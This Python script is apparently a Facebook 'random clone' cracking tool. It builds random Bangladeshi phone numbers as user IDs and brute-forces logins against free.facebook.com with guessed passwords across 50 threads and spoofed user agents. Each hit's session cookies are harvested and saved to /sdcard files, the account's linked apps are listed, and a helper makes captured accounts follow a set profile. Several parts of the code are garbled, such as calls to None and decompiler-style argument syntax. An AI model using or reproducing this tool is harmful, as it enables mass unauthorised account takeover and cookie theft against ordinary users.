import os
import sys
import time
import requests
import uuid

os.system('git pull')

os.system('pkg install curl')

class jalan:

    

    def __init__(self, z):
    	
        pass


def ud():
	
    os.system('clear')
    
    jalan(logo)
    print(' \033[38;5;196m[\033[38;5;195m01\033[38;5;196m]\x1b[1;97m JOIN MY GROUP')
    print(' \033[38;5;196m[\033[38;5;195m00\033[38;5;196m]\x1b[1;97m EXIT')
    print('\x1b[1;97m===================================================')
    
    opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\x1b[1;97m Choose option \x1b[1;97m: \x1b[1;97m')

    if opt == '1':

        os.system('xdg-open https://facebook.com/groups/3206414299669908/')

        ND()

        return None

    None('\n\x1b[1;31mEXIT\x1b[0;97m')

def ND():

    os.system('clear')

    print(logo)

    print(' \033[38;5;196m[\033[38;5;195m01\033[38;5;196m]\x1b[1;97m ENTER TO RUN')
    print(' \033[38;5;196m[\033[38;5;195m00\033[38;5;196m]\033[38;5;196m EXIT')
    opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\x1b[1;97m Choose option \x1b[1;97m: \x1b[1;97m')
    
    if opt == '1':

        os.system('xdg-open https://www.facebook.com/profile.php?id=100003174443045')

        o()

        return None

    None('\n\x1b[1;31mEXIT\x1b[0;97m')

def o():
	
    os.system('clear'
)
    jalan(logo)
    jalan(' \033[38;5;196m[\033[38;5;195m01\033[38;5;196m]\x1b[1;97m RANDOM CLONE ')
    jalan(' \033[38;5;196m[\033[38;5;195m02\033[38;5;196m]\x1b[1;97m CONTAC ADMIN')
    jalan(' \033[38;5;196m[\033[38;5;195m03\033[38;5;196m]\x1b[1;97m JOIN MY GROUP')
    jalan(' \033[38;5;196m[\033[38;5;195m00\033[38;5;196m]\x1b[1;97m EXIT')
    print(' \x1b[1;97m===================================================')

    opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Choose option \x1b[1;97m: \x1b[1;97m ')

    if opt == '1':

        i()

    if None == '2':

        os.system('xdg-open https://www.facebook.com/profile.php?id=100003174443045')
        return None
    if None == '3':
        os.system('xdg-open https://facebook.com/groups/3206414299669908/')
        return None
    if None == '0':
        os.system('exit')
        return None
    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    

def cek_apk(session,coki):

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print('')

 

def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text

            

            

 

class jalan:

    def __init__(self, z):

        for e in z + "\n":

            sys.stdout.write(e)

            sys.stdout.flush()

            time.sleep(0.009)

            

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU  

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today()

logo =("""
  \x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
  88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
  88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
  88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
  88 `88. 88   88 88      db   8D 88   88 88  V888 
  88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
\x1b[1;97m===================================================
  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m AUTHOR  : RAFSAN AHAMMED RAFI
  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m FACEBOOK: MD. ARIF MIA
  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m GITHUB  : R4FSAN-143
  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m WATHAPP : 0130xxxxx54
  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m TOOLS   : AUTO CRACK
  \033[38;5;196m[\033[38;5;195m√\033[38;5;196m]\x1b[1;97m Stetus  : FREE
  \033[38;5;196m[\033[38;5;195m★\033[38;5;196m]\x1b[1;97m VIRSION : 0.5
====================================================""")

loop = 0

oks = []

cps = []

 

def clear():

    os.system('clear')

    print(logo)

from time import localtime as lt

from os import system as cmd

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "PM"

else:

    a = ltx

    tag = "AM"

    

    

try:

    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')

    v = 5.2

    update = ('5.2')

    update = ('5.2')

    if str(v) in update:

        os.system('clear')

    else:pass

except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions

def dynamic(text):

    titik = ['.   ','..  ','... ','.... ']

    for o in titik:

        print('\r'+text+o),

        sys.stdout.flush();time.sleep(1)

 

#User agents

ugen2=[]

ugen=[]

 

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

    

# APK CHECK

def i():

    user=[]

    twf =[]

    os.getuid

    os.geteuid

    os.system("clear")

    jalan(logo)

    
    jalan(' \x1b[1;97m===================================================')
    jalan(' \x1b[1;97m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m BD CODES    \033[38;5;45m016, \033[38;5;46m017 ,\033[38;5;192m018 ,\033[38;5;195m019  ...\033[0;97m')
    jalan(' \x1b[1;97m===================================================')
    code = input('\x1b[1;97m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m SIM CODE\033[38;5;195m : \033[38;5;46m')
    print("\x1b[1;97m===================================================")
    limit = int(input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m EXAMPLE\033[38;5;46m: \033[38;5;195m2000, \033[38;5;46m3000, \033[38;5;45m50000, \033[38;5;46m100000\n \033[1;93m===================================================\n \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m CLONING LIMIT\033[38;5;195m:\033[38;5;46m '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    os.system("clear")
    print(logo)
    passx = int(input("\x1b[1;97m[\033[38;5;195m•\033[38;5;196m]\x1b[1;97m Enter Password Limit\x1b[1;97m : \x1b[1;97m"))
    HamiiID = []
    print("")
    print("\x1b[1;97m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example \033[38;5;195m: \033[38;5;46mbangladesh, \033[38;5;192mi love you, \033[38;5;45mfreefire, \033[38;5;195m12345678, Enc.")
    print("")
    for bilal in range(passx):

        pww = input(" \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Enter Password\033[38;5;195m :\033[38;5;46m ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:

        clear()

        tl = str(len(user))

        print('\x1b[1;97m TOTAL IDS: \033[38;5;46m'+tl)
        print('\x1b[1;97m THE PROCESS HAS BEEN STARTED')
        print('\x1b[1;97m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print(' \x1b[1;97mWORKING&DATA WIFI ')
        print(' \x1b[1;97m===================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print(' \x1b[1;97m===================================================')
    print('\033[38;5;46mClone process has been completed')
    print('\033[38;5;46mIds saved in ok.txt,cp.txt')
    print(' \x1b[1;97m===================================================')
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-language": 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            "referer": 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(' \033[38;5;46m[R4FSAN-OK]  ' +uid+ ' | ' +ps+    '  \n \033[38;5;195mCookie 🍪= \033[38;5;192m'+coki+  ' \n \033[38;5;45mUsar Agent 👾= \033[38;5;126m'+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/R4FSAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print( ' \033[38;5;196m[R4FSAN-CP]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/R4FSAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[R4FSAN-XD] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

 

ud()